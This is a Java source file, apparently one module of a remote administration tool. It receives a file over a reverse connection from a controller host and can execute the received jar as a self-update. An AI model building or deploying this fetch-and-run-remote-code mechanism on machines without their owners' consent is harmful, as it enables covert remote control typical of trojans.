package rt.modulos.archivos;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import network.Conexion;
import rt.Inicio;
import comunes.Interfaz;
import rt.util.Protocolo;
import rt.util.UtilRT;

//descarga archivos (Funcion subir archivos)
public class DAR extends Thread implements Interfaz {

    private Interfaz servicio;
    private Conexion conexion;
    private String archivoaRecibir;
    private String ruta;
    private boolean actualizacion;
    private int bufferSize;

    public void instanciar(Object... parametros) {
        try {
            this.servicio = (Interfaz) parametros[0];
            //para todos los casos
            this.archivoaRecibir = (String) parametros[1];
            this.ruta = (String) parametros[2];
            switch (parametros.length) {
                case 3:
                    actualizacion = false;
                    break;
                case 4:
                    actualizacion = (Boolean) parametros[3];
                    break;
                case 5:
                    actualizacion = false;
                    this.conexion = (Conexion) parametros[3];
                    this.bufferSize = (Integer) parametros[4];
                    break;
                case 6:
                    actualizacion = (Boolean) parametros[3];
                    this.conexion = (Conexion) parametros[4];
                    this.bufferSize = (Integer) parametros[5];
                    break;
            }
        } catch (Exception e) {
        }
    }

    private void iniciar() {
        start();
    }

    @Override
    public void run() {
        try {
            if ((Boolean) servicio.get(5)) {//conexion inversa
                conexion = new Conexion((String) servicio.get(2), (Integer) servicio.get(4), (Integer) Inicio.config.obtenerParametro("protocolo"), (Boolean) Inicio.config.obtenerParametro("ssl"));
                bufferSize = conexion.getReceiveBufferSize();
                conexion.escribirInt(Protocolo.ADMIN_ARCHIVOS_SUBIR);
            }
            conexion.escribirObjeto(UtilRT.texto(archivoaRecibir + ":::" + Inicio.i));
            String nombre = UtilRT.leerCadena((byte[]) conexion.leerObjeto());
            String nombreTmp = nombre + ".par";
            File carpeta;
            if (ruta.contains("<tmp>")) {
                carpeta = File.createTempFile("Tmp", "").getParentFile();
            } else {
                carpeta = new File(ruta.trim());
            }
            if (!carpeta.exists()) {
                carpeta.mkdirs();
            }
            File archivoTmp = new File(carpeta, nombreTmp);
            if (archivoTmp.exists()) {
                archivoTmp.delete();
            }
            FileOutputStream out = new FileOutputStream(archivoTmp);
            byte[] buf = new byte[bufferSize];
            int i;
            while ((i = conexion.read(buf)) > 0) {
                out.write(buf, 0, i);
            }
            out.close();
            File archivo = new File(carpeta, nombre);
            if (archivo.exists()) {
                archivo.delete();
            }
            archivoTmp.renameTo(archivo);
            out = null;
            buf = null;
            if (actualizacion) {
                if (archivo.exists()) {
                    try {
                        final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
                        final ArrayList<String> command = new ArrayList<String>();
                        command.add(javaBin);
                        command.add("-jar");
                        command.add(archivo.getAbsolutePath());
                        command.add("--update");//actualizacion
                        final ProcessBuilder builder = new ProcessBuilder(command);
                        builder.start();
                        Inicio.d();
                    } catch (Exception e) {
                        servicio.ejecutar(6, "Error al abrir al servidor " + e.getMessage());
                    }
                } else {
                    servicio.ejecutar(6, "Error al subir servidor. Intentar nuevamente ");
                }
            }
        } catch (Exception ex) {
            servicio.ejecutar(6, "Error al subir archivo . Intentar nuevamente Error=" + ex.getMessage());
            servicio.ejecutar(6, "Archivo=" + archivoaRecibir);
        } finally {
            try {
                conexion.cerrar();
            } catch (Exception ex) {

            }
            conexion = null;
        }
    }

    public void set(int opcion, Object valor) {

    }

    public Object get(int opcion, Object... parametros) {
        return null;

    }

    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                iniciar();
                break;
        }
    }
}
